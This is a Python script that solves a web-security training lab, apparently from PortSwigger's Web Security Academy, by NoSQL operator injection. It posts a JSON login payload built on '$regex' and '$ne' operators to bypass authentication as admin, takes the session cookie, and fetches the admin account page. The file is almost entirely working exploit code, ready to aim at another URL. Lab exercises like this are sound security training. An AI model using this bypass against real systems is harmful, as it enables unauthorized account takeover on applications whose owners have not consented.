#############################################################################
#
# Lab: Exploiting NoSQL operator injection to bypass authentication
#
# Hack Steps: 
#      1. Injecting operators in the request body to bypass authentication
#         and login as admin
#      2. Extract session cookie from the response headers
#      3. Fetch the admin profile
#
#############################################################################
import requests
import re
from colorama import Fore

# Change this to your lab URL
LAB_URL = "https://0a9e00d10352f84083d23d9c008b00c4.web-security-academy.net"

def main():
    print("â¦—1â¦˜ Injecting operators in the request body to bypass authentication.. ",end="", flush=True)
    
    payload = """ { "username": { "$regex": "admin.*" }, "password": { "$ne": "" } } """
    headers = { "Content-Type": "application/json" }
    login_as_admin = post_data("/login", payload, headers)
        
    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "â¦—2â¦˜ Extracting session cookie of the admin.. ",end="", flush=True)

    session = login_as_admin.cookies.get("session")
    admin_username = re.findall("id=(.*)", login_as_admin.headers.get("Location"))[0]

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "â¦—3â¦˜ Fetching " + Fore.YELLOW + admin_username + Fore.WHITE + " profile.. ",end="", flush=True)

    cookies = { "session": session }
    fetch("/my-account", cookies)
 
    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "ðŸ—¹ The lab should be marked now as " + Fore.GREEN + "solved")


def fetch(path, cookies):
    try:  
        return requests.get(f"{LAB_URL}{path}", cookies=cookies, allow_redirects=False)
    except:
        print(Fore.RED + "â¦—!â¦˜ Failed to fetch " + path + " through exception")
        exit(1)


def post_data(path, data, headers):
    try:    
        return requests.post(f"{LAB_URL}{path}", data, headers=headers, allow_redirects=False)
    except:
        print(Fore.RED + "â¦—!â¦˜ Failed to post data to " + path + " through exception")
        exit(1)


if __name__ == "__main__":
    main()